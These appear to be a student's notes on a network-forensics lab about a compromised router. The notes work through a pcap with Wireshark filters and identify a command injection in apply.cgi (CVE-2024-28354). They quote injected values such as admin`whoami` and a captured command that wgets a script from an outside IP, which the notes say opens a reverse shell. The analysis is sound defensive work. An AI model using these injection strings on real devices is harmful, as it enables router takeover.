task 1
	Router model name found in login page which is fetched from pcap GET request to router.

task 2
	 There is a get request for a success.txt?ipv4 in packets so searching for this string in filter `http && frame contains "success.txt"`  gave four hits of which 2 were incorrect login attempts before access.

task 3,4
	 filter for post http requests. `apply_sec.cgi` where the password is nothing logged at time `2024-05-01 15:53:27`

task 5
	 after dumping javascript files log_pass is the field or param for password and filter `frame contains "log_pass" && http.request.method == "POST"` gave a few packets which showed the first password length is zero

pandoraBox.js file contains an array os asp pages.
task 6
	 online search for vulns gave 2.10 fw version

task 7
	 with the online search command injection is identified in apply.cgi file in which usbapps.config.smb_admin_name key allows users to enter commands as admin\`whoami\`

task 8
	 google search for tew87url or whatever samba led to 
	 https://www.cybersecurity-help.cz/vdb/SB2024031936
	 CVE-2024-28354
	 also there is a previous vuln  at https://www.tenable.com/security/research/tra-2021-54

task 9,10
	 in wireshark going for all the packets to apply.cgi and checking for task7 param for commands identified admin`wget http://35.159.25.253:8000/a1l4m.sh`

task 11
	 opening the stream gave the response message `Access to this resource is forbidden`

task 12
	 looking for GET requests on `all4m.sh` got the bash file inside which a reverse shell is connecting to `35.159.25.253` on port `41143`
